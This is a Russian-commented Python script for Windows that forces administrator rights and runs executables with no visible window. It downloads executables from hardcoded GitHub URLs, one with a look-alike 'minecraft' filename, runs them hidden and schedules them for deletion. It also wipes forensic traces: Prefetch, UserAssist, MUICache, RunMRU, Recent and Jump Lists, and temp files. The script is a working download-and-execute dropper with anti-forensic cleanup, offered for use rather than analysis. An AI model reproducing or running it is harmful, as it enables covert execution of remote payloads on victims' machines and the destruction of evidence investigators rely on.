import os
import sys
import ctypes
import shutil
import subprocess
import winreg
import tempfile
from pathlib import Path

try:
    import requests
except ImportError:
    print("[!] Установи requests: pip install requests")
    sys.exit(1)

# ---------- Константы ----------
MOVEFILE_DELAY_UNTIL_REBOOT = 0x4
CREATE_NO_WINDOW = 0x08000000
DETACHED_PROCESS = 0x00000008

# ---------- Проверка прав администратора ----------
def is_admin():
    try:
        return bool(ctypes.windll.shell32.IsUserAnAdmin())
    except Exception:
        return False

def require_admin():
    if not is_admin():
        print("[!] Требуются права администратора. Перезапуск...")
        try:
            params = " ".join(f'"{a}"' for a in sys.argv)
            ctypes.windll.shell32.ShellExecuteW(
                None, "runas", sys.executable, params, None, 1
            )
        except Exception as e:
            print(f"[!] Не удалось перезапуститься: {e}")
        sys.exit(0)

# ---------- 1. Запуск exe ----------
def run_hidden(exe_path):
    exe_path = str(exe_path)
    if not os.path.isfile(exe_path):
        print(f"[!] Файл не найден: {exe_path}")
        return False
    print(f"[*] Запуск: {exe_path}")
    try:
        subprocess.Popen(
            [exe_path],
            creationflags=CREATE_NO_WINDOW | DETACHED_PROCESS,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            stdin=subprocess.DEVNULL,
            close_fds=True,
        )
        return True
    except Exception as e:
        print(f"[!] Ошибка запуска: {e}")
        return False

# ---------- 2. Очистка Prefetch ----------
def clean_prefetch(exe_name):
    pf_dir = Path(r"C:\Windows\Prefetch")
    if not pf_dir.exists() or not exe_name:
        print("[i] Prefetch: пропущено")
        return
    base = Path(exe_name).name.upper()
    if not base:
        print("[i] Prefetch: пустое имя, пропущено")
        return
    removed = 0
    for f in pf_dir.glob("*.pf"):
        try:
            if f.name.upper().startswith(base):
                f.unlink()
                removed += 1
        except (PermissionError, FileNotFoundError, OSError):
            pass
    print(f"[+] Prefetch: удалено {removed} файлов")

# ---------- 3. Очистка UserAssist ----------
def clean_userassist():
    key_path = r"Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist"
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_ALL_ACCESS) as root:
            i = 0
            while True:
                try:
                    sub = winreg.EnumKey(root, i)
                except OSError:
                    break
                try:
                    with winreg.OpenKey(root, sub, 0, winreg.KEY_ALL_ACCESS) as s:
                        try:
                            winreg.DeleteKey(s, "Count")
                        except FileNotFoundError:
                            pass
                except OSError:
                    pass
                i += 1
        print("[+] UserAssist очищен")
    except Exception as e:
        print(f"[!] UserAssist: {e}")

# ---------- 4. Очистка MUICache (безопасно) ----------
def clean_muicache():
    key_path = r"Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache"
    # Системные ключи, которые нельзя трогать
    protected = {
        "LangID", "Default", "CacheVersion", "CacheVersionMajor",
    }
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_ALL_ACCESS) as k:
            i = 0
            to_del = []
            while True:
                try:
                    name, _, _ = winreg.EnumValue(k, i)
                except OSError:
                    break
                if name not in protected:
                    to_del.append(name)
                i += 1
            for n in to_del:
                try:
                    winreg.DeleteValue(k, n)
                except OSError:
                    pass
        print(f"[+] MUICache очищен ({len(to_del)} записей)")
    except Exception as e:
        print(f"[!] MUICache: {e}")

# ---------- 5. Recent / Jump Lists ----------
def clean_recent():
    appdata = os.getenv("APPDATA")
    if not appdata:
        print("[i] Recent: APPDATA не найден, пропущено")
        return
    paths = [
        Path(appdata) / r"Microsoft\Windows\Recent",
        Path(appdata) / r"Microsoft\Windows\Recent\AutomaticDestinations",
        Path(appdata) / r"Microsoft\Windows\Recent\CustomDestinations",
    ]
    count = 0
    for p in paths:
        if not p.exists():
            continue
        try:
            for f in p.iterdir():
                try:
                    if f.is_file():
                        f.unlink()
                        count += 1
                except (PermissionError, FileNotFoundError, OSError):
                    pass
        except OSError:
            pass
    print(f"[+] Recent/JumpLists: удалено {count} файлов")

# ---------- 6. RunMRU ----------
def clean_runmru():
    key_path = r"Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_ALL_ACCESS) as k:
            i = 0
            to_del = []
            while True:
                try:
                    name, _, _ = winreg.EnumValue(k, i)
                except OSError:
                    break
                if name != "MRUList":
                    to_del.append(name)
                i += 1
            for n in to_del:
                try:
                    winreg.DeleteValue(k, n)
                except OSError:
                    pass
            try:
                winreg.SetValueEx(k, "MRUList", 0, winreg.REG_SZ, "")
            except OSError:
                pass
        print("[+] RunMRU очищен")
    except FileNotFoundError:
        print("[i] RunMRU: ключ не найден")
    except Exception as e:
        print(f"[!] RunMRU: {e}")

# ---------- 7. Временные файлы ----------
def clean_temp():
    tmp = os.getenv("TEMP")
    if not tmp:
        print("[i] TEMP: не найден, пропущено")
        return
    tmp = Path(tmp)
    count = 0
    if not tmp.exists():
        print("[i] TEMP: папка не существует")
        return
    for f in tmp.iterdir():
        try:
            if f.is_file():
                f.unlink()
                count += 1
            elif f.is_dir():
                shutil.rmtree(f, ignore_errors=True)
                count += 1
        except (PermissionError, FileNotFoundError, OSError):
            pass
    print(f"[+] TEMP: удалено {count} объектов")

# ---------- 8. Amcache ----------
def clean_amcache():
    amcache = Path(r"C:\Windows\AppCompat\Programs\Amcache.hve")
    if not amcache.exists():
        print("[i] Amcache: файл не найден")
        return
    print("[!] Amcache.hve заблокирован системой — полная очистка требует offline-режима")
    try:
        backup = amcache.with_suffix(".hve.bak")
        if not backup.exists():
            shutil.copy2(amcache, backup)
        print("[i] Создана резервная копия Amcache.hve.bak")
    except Exception as e:
        print(f"[!] Amcache: {e}")

# ---------- 9. BAM/DAM ----------
def clean_bam():
    print("[i] BAM/DAM: очистка требует прав SYSTEM (пропущено)")

# ---------- 10. Удаление самого exe ----------
def delete_exe_later(exe_path):
    if not exe_path:
        print("[i] Удаление exe: пустой путь, пропущено")
        return
    exe_path = os.path.abspath(str(exe_path))
    if not os.path.exists(exe_path):
        print(f"[i] Удаление exe: файл не существует ({exe_path})")
        return
    try:
        ok = ctypes.windll.kernel32.MoveFileExW(
            ctypes.c_wchar_p(exe_path),
            None,
            MOVEFILE_DELAY_UNTIL_REBOOT,
        )
        if ok:
            print(f"[+] {exe_path} будет удалён при перезагрузке")
        else:
            err = ctypes.get_last_error()
            print(f"[!] MoveFileExW вернул 0 (err={err})")
    except Exception as e:
        print(f"[!] MoveFileEx: {e}")

# ---------- Главный оркестратор ----------
def hide_traces(exe_path):
    exe_name = Path(exe_path).name if exe_path else ""
    print("=" * 50)
    print(" ОЧИСТКА СЛЕДОВ")
    print("=" * 50)
    clean_prefetch(exe_name)
    clean_userassist()
    clean_muicache()
    clean_recent()
    clean_runmru()
    clean_temp()
    clean_amcache()
    clean_bam()
    delete_exe_later(exe_path)
    print("=" * 50)
    print("[+] Готово")

# ---------- 11. Скачивание и запуск ----------
def download_and_run(url):
    if not url or not url.lower().startswith(("http://", "https://")):
        print("[!] Некорректная ссылка")
        return
    print(f"[*] Скачивание: {url}")

    parsed = url.split("?")[0]
    filename = os.path.basename(parsed)
    if not filename or not filename.lower().endswith(".exe"):
        filename = "payload.exe"

    exe_path = os.path.join(tempfile.gettempdir(), filename)

    try:
        response = requests.get(url, stream=True, timeout=30)
        response.raise_for_status()
        total = 0
        with open(exe_path, "wb") as f:
            for chunk in response.iter_content(chunk_size=8192):
                if chunk:
                    f.write(chunk)
                    total += len(chunk)
        print(f"[+] Скачано {total} байт в: {exe_path}")
        if run_hidden(exe_path):
            delete_exe_later(exe_path)
    except requests.RequestException as e:
        print(f"[!] Ошибка сети: {e}")
    except Exception as e:
        print(f"[!] Ошибка: {e}")

# ---------- Меню ----------
def main():
    require_admin()
    urls = {
        "5": "https://github.com/galarol/yandex/raw/refs/heads/main/LL.exe",
        "6": "https://github.com/galarol/yandex/raw/refs/heads/main/minесraft.exe",
    }
    while True:
        print("\n--- МЕНЮ ---")
        print("1. Запустить exe скрыто")
        print("2. Очистить следы")
        print("3. Запустить + очистить")
        print("4. Скачать exe по ссылке и запустить скрыто")
        print("5. Скачать и запустить WЕХSIDЕ (по умолчанию)")
        print("6. Скачать и запустить CАТLАVАN (по умолчанию)")
        print("0. Выход")
        try:
            choice = input("> ").strip()
        except (EOFError, KeyboardInterrupt):
            print("\n[i] Выход")
            break

        try:
            if choice == "1":
                p = input("Путь к exe: ").strip().strip('"')
                run_hidden(p)
            elif choice == "2":
                p = input("Имя/путь exe для Prefetch (Enter — пропустить): ").strip().strip('"')
                hide_traces(p)
            elif choice == "3":
                p = input("Путь к exe: ").strip().strip('"')
                if run_hidden(p):
                    input("Нажмите Enter после завершения exe...")
                    hide_traces(p)
            elif choice == "4":
                url = input("Прямая ссылка на .exe: ").strip()
                download_and_run(url)
            elif choice in urls:
                download_and_run(urls[choice])
            elif choice == "0":
                break
            else:
                print("[i] Нет такого пункта")
        except KeyboardInterrupt:
            print("\n[i] Прервано")
        except Exception as e:
            print(f"[!] Ошибка: {e}")

if __name__ == "__main__":
    main()